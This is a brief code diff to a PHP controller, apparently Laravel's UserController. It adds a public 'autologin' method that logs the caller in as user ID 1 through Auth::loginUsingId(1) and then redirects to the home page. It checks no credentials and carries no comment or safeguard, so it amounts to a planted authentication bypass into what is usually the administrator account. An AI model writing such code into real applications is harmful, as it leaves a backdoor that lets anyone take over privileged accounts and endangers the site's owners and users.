@@ -26,5 +26,10 @@ class UserController extends Controller
 
     return $id;
   }
+  public function autologin()
+  {
+    Auth::loginUsingId(1);
+    return redirect('/');
+  }
 
 }
